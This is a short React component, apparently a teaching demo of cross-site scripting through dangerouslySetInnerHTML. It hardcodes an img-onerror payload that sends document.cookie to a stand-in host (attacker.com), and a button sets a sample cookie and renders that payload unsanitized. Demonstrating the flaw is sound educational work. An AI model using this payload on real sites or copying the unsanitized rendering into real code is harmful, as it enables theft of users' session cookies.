import React, { useState } from 'react';

const DangerouslySetInnerHTMLAttack = () => {
    // Example of potentially malicious user input
    const userInput = `<img src="x" onerror="document.location='http://attacker.com?cookie=' + document.cookie;" />`;

    const safeInput = `<p>This is a safe static content example.</p>`;
    const [showUnsafe, setShowUnsafe] = useState(false);
    return (
        <div>
            <h2>DangerouslySetInnerHTML XSS Attack</h2>
            <p>
                This example demonstrates how using <code>dangerouslySetInnerHTML</code> can lead to Cross-Site Scripting (XSS) vulnerabilities when processing untrusted user input.
            </p>

            <button onClick={() => {
                setShowUnsafe(true)
                document.cookie = 'password' + "=" + 'john' + ";" + ";path=/";
            }

            }>
                Show Unsafe</button>
            {
                showUnsafe &&

                <div
                    style={{
                        border: '1px solid red',
                        padding: '10px',
                        marginBottom: '20px',
                    }}
                    dangerouslySetInnerHTML={{ __html: userInput }} // Unsafe: renders untrusted input
                />
            }

        </div>
    );
};

export default DangerouslySetInnerHTMLAttack;
